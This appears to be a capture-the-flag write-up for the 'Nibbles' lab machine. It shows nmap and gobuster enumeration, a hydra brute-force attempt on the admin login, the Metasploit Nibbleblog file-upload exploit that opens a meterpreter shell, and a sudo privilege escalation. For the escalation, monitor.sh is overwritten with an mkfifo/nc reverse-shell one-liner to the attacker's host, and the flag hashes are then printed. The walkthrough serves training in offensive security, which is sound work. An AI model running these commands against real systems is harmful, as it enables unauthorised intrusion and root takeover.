# Nibbles -
```bash
nmap -sV -sC 10.129.55.136      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 07:46 EDT
Nmap scan report for 10.129.55.136
Host is up (0.051s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
```
```bash
visit http://10.129.55.136:80/ and check page source.
There is note about /nibbleblog/ so let's check http://10.129.55.136/nibbleblog/
```
```bash
gobuster dir -u http://10.129.55.136/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.55.136/nibbleblog/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/languages            (Status: 301) [Size: 329] [--> http://10.129.55.
/.php                 (Status: 403) [Size: 303]
/content              (Status: 301) [Size: 327] [--> http://10.129.55.
/index.php            (Status: 200) [Size: 2987]
/themes               (Status: 301) [Size: 326] [--> http://10.129.55.
/sitemap.php          (Status: 200) [Size: 402]
/admin                (Status: 301) [Size: 325] [--> http://10.129.55.
/admin.php            (Status: 200) [Size: 1401]
/feed.php             (Status: 200) [Size: 302]
/plugins              (Status: 301) [Size: 327] [--> http://10.129.55.
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
Progress: 134167 / 283418 (47.34%)[ERROR] Get "http://10.129.55.136/nibbleblog/84101": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 283416 / 283418 (100.00%)
===============================================================
Finished
===============================================================
```
```bash
check http://10.129.55.136/nibbleblog/admin.php
```
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.55.136 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Your username or password is incorrect." -V 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-23 10:37:27
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.129.55.136:80/nibbleblog/admin.php:username=^USER^&password=^PASS^:Your username or password is incorrect.
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.129.55.136 - login "admin" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[80][http-post-form] host: 10.129.55.136   login: admin   password: 1234567
[80][http-post-form] host: 10.129.55.136   login: admin   password: iloveyou
[80][http-post-form] host: 10.129.55.136   login: admin   password: rockyou
[80][http-post-form] host: 10.129.55.136   login: admin   password: 12345678
[80][http-post-form] host: 10.129.55.136   login: admin   password: 12345
[80][http-post-form] host: 10.129.55.136   login: admin   password: 123456789
[80][http-post-form] host: 10.129.55.136   login: admin   password: 123456
[80][http-post-form] host: 10.129.55.136   login: admin   password: princess
[80][http-post-form] host: 10.129.55.136   login: admin   password: abc123
[80][http-post-form] host: 10.129.55.136   login: admin   password: nicole
[80][http-post-form] host: 10.129.55.136   login: admin   password: jessica
[80][http-post-form] host: 10.129.55.136   login: admin   password: monkey
[80][http-post-form] host: 10.129.55.136   login: admin   password: lovely
[80][http-post-form] host: 10.129.55.136   login: admin   password: password
[80][http-post-form] host: 10.129.55.136   login: admin   password: babygirl
[80][http-post-form] host: 10.129.55.136   login: admin   password: daniel
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-23 10:37:29

I got blacklisted because of hydra and we couldn't find the password so tried random passwords
and found out that
username:admin
password:nibbles
```
```bash
After we login, we can find out Nibbleblog version is Nibbleblog 4.0.3 "Coffee" from settings page.
```
```bash
searchsploit nibbleblog
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                            | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                             | php/remote/38489.rb
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
```bash
msfconsole
msf6 > search nibbleblog
                                                                                                                                                    
Matching Modules                                                                                                                                    
================                                                                                                                                    
                                                                                                                                                    
   #  Name                                       Disclosure Date  Rank       Check  Description                                                     
   -  ----                                       ---------------  ----       -----  -----------                                                     
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability                            
                                                                                                                                                    
                                                                                                                                                    
Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
msf6 > use 0                                                                                                                                        
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
TARGETURI => /nibbleblog/
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.55.136
RHOSTS => 10.129.55.136
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
[*] Started reverse TCP handler on 10.10.14.56:4444 
[*] Sending stage (39927 bytes) to 10.129.55.136
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.56:4444 -> 10.129.55.136:47290) at 2024-05-24 02:32:26 -0400
meterpreter > pwd
/var/www/html/nibbleblog/content/private/plugins/my_image
meterpreter > shell
Process 4391 created.
Channel 0 created.
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
cd /home/nibbler
ls
personal.zip
user.txt
cat user.txt
f22c81754ee53a49391b8834a21b3173
```
```bash
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
cd personal
ls
stuff
cd stuff
ls
monitor.sh
cp monitor.sh monitor.sh.bak
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.56 1234 >/tmp/f " > monitor.sh
sudo ./monitor.sh
rm: cannot remove '/tmp/f': No such file or directory
```
```bash
nc -nvlp 1234             
listening on [any] 1234 ...
connect to [10.10.14.56] from (UNKNOWN) [10.129.55.136] 37550
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# pwd
/home/nibbler/personal/stuff
# cd ..
# cd ..
# cd ..
# cd ..
# ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt
bed1400cbecf774d0542d205c6e2b929
```
# References
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
